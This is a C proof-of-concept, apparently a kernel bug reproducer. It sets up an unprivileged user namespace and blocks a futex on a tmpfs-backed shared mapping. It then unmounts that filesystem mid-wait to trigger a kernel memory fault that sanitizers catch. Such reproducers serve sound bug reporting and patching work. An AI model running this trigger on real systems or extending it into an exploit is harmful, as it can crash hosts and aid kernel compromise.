/*gcc -pthread -o test test.c*/
#define _GNU_SOURCE
#include <pthread.h>
#include <stdio.h>
#include <fcntl.h>
#include <err.h>
#include <string.h>
#include <unistd.h>
#include <sys/mount.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <linux/futex.h>

static void write_file(char *name, char *buf) {
  int fd = open(name, O_WRONLY);
  if (fd == -1)
    return;
  if (write(fd, buf, strlen(buf)) != strlen(buf))
    return;
  close(fd);
}

static void write_map(char *name, int outer_id) {
  char buf[100];
  sprintf(buf, "0 %d 1", outer_id);
  write_file(name, buf);
}

static char *mapping;

static void *futex_thread(void *dummy) {
  // printf("entering FUTEX_WAIT\n");
  struct timespec timeout = { .tv_sec = 3 };
  syscall(SYS_futex, mapping, FUTEX_WAIT, 0, &timeout, /*ignored*/0, /*ignored*/0);
  // printf("FUTEX_WAIT returned; ASAN should have triggered at this point\n");
  return NULL;
}

int main(void) {
  int outer_uid = getuid();
  int outer_gid = getgid();
  if (unshare(CLONE_NEWNS|CLONE_NEWUSER))
    return -1;
  write_file("/proc/self/setgroups", "deny");
  write_map("/proc/self/uid_map", outer_uid);
  write_map("/proc/self/gid_map", outer_gid);

  if (mount("none", "/tmp", "tmpfs", 0, ""))
    return -1;
  int fd = open("/tmp/x", O_RDWR|O_CREAT, 0600);
  if (fd == -1)
    return -1;
  if (ftruncate(fd, 0x1000))
    return -1;
  mapping = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
  if (mapping == MAP_FAILED)
    return -1;
  close(fd);

  pthread_t thread;
  if (pthread_create(&thread, NULL, futex_thread, NULL))
    return -1;

  sleep(1);
  // printf("nuking the mount...\n");
  if (munmap(mapping, 0x1000))
    return -1;
  if (umount("/tmp"))
    return -1;
  // printf("umount done; VFS should have complained at this point\n");

  if (pthread_join(thread, NULL))
    return -1;
  return 0;
}